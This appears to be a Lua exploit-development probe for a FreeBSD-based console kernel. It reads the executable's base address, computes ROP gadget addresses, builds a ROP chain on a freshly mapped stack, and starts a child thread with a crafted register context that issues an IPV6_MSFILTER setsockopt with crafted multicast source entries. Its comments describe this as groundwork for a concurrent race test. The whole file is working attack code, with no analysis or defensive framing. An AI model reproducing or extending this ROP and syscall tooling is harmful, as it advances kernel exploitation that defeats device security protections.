-- CRASH_CLASS: MODERATE
-- Probe 50h: one child-thread IPV6_MSFILTER syscall, no race.
-- Verify the child ROP syscall ABI before any concurrent leave test.

print("=== PROBE 50h: MSFILTER CHILD CONTROL ===")
local function num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wd(p, v) memory.write_dword(p, v) end
local function wq(p, v) memory.write_qword(p, v) end
local function z(p, n) for off = 0, n - 4, 4 do wd(p + off, 0) end end
local function byte(p, i, v) memory.write_byte(p + i, v) end
local function fmt(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return tostring(v)
end
local function msleep(ms)
    local ts = memory.alloc(16)
    wq(ts, uint64(0)); wq(ts + 8, uint64(ms * 1000000))
    sc(240)(uint64(ts), uint64(0))
end

local info = memory.alloc(0x200)
z(info, 0x200); wd(info, 0x160)
local ir = sc(593)(uint64(0), uint64(info))
local lo = num(memory.read_dword(info + 0x108))
local hi = num(memory.read_dword(info + 0x10c))
print("dynlib=" .. tostring(ir) .. " eboot_hi=" .. string.format("0x%X", hi))
if lo == 0 then print("=== NO EBOOT ===") return end
local base = uint64(string.format("0x%X%08X", hi, lo))
local RET = base + 0x42
local POP_RAX = base + 0x992
local POP_RDI = base + 0xC9DFE
local MOV_RDI_RAX = base + 0x92C67
local JMP_SELF = base + 0x15481
local STUB = syscall.pipe.fn_addr

local fd = num(sc(97)(uint64(28), uint64(2), uint64(17)))
print("socket=" .. fd)
if fd < 0 or fd > 1024 then print("=== NO SOCKET ===") return end
local mreq = memory.alloc(32)
z(mreq, 32)
byte(mreq, 0, 0xff); byte(mreq, 1, 2); byte(mreq, 15, 1)
wd(mreq + 16, 1)
local join = sc(105)(uint64(fd), uint64(41), uint64(12), uint64(mreq), uint64(20))
print("join=" .. tostring(join))
if num(join) ~= 0 then sc(6)(uint64(fd)); print("=== NO MEMBERSHIP ==="); return end

local req = memory.alloc(160)
local sources = memory.alloc(128 * 128)
z(req, 160)
wd(req, 1); wd(req + 4, 1); wd(req + 8, 128)
byte(req, 16, 28); byte(req, 17, 28)
byte(req, 24, 0xff); byte(req, 25, 2); byte(req, 39, 1)
wd(req + 40, 1)
wq(req + 144, sources)
for i = 1, 128 do
    local p = sources + (i - 1) * 128
    z(p, 128)
    byte(p, 0, 28); byte(p, 1, 28)
    byte(p, 8, 0x20); byte(p, 9, 1); byte(p, 23, i)
end

local marker = memory.alloc(16)
wq(marker, uint64(0xDEADDEAD))
local stack = sc(477)(uint64(0), uint64(0x10000), uint64(3), uint64(0x1002), uint64(0xffffffff), uint64(0))
print("stack=" .. fmt(stack))
local chain = stack + 0x10000 - 0x100
z(chain, 0x100)
local off = 0
local function push(v) wq(chain + off, v); off = off + 8 end
push(POP_RAX); push(uint64(105)); push(STUB)
push(POP_RDI); push(marker); push(MOV_RDI_RAX)
push(POP_RDI); push(uint64(0)); push(POP_RAX); push(uint64(431)); push(STUB)
push(JMP_SELF)

local ctx = memory.alloc(0x500)
z(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480))
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0c0, uint64(0x43)); wq(ctx + 0x100, uint64(0x3b))
wq(ctx + 0x0f8, chain); wq(ctx + 0x0e0, RET)
wq(ctx + 0x048, uint64(fd))
wq(ctx + 0x050, uint64(41))
wq(ctx + 0x058, uint64(74))
wq(ctx + 0x060, req) -- wrapper ABI arg4/RCX
wq(ctx + 0x098, req) -- raw syscall arg4/R10; ctx+0x090 is RBP
wq(ctx + 0x068, uint64(152)) -- syscall arg5/R8

local tidbuf = memory.alloc(8)
z(tidbuf, 8)
print("BEFORE thr_create")
local cr = sc(430)(uint64(ctx), uint64(tidbuf), uint64(0))
local tid = memory.read_qword(tidbuf)
print("thr_create=" .. tostring(cr) .. " tid=" .. fmt(tid))
if num(cr) ~= 0 then
    sc(105)(uint64(fd), uint64(41), uint64(13), uint64(mreq), uint64(20))
    sc(6)(uint64(fd)); print("=== CHILD REJECTED ==="); return
end
msleep(30)
local rv = memory.read_qword(marker)
print("child setsockopt return=" .. fmt(rv))
print("child status=" .. tostring(sc(433)(tid, uint64(0))))
print("leave=" .. tostring(sc(105)(uint64(fd), uint64(41), uint64(13), uint64(mreq), uint64(20))))
sc(6)(uint64(fd))
print("canary pid=" .. tostring(sc(20)()))
print("=== PROBE 50h COMPLETE ===")
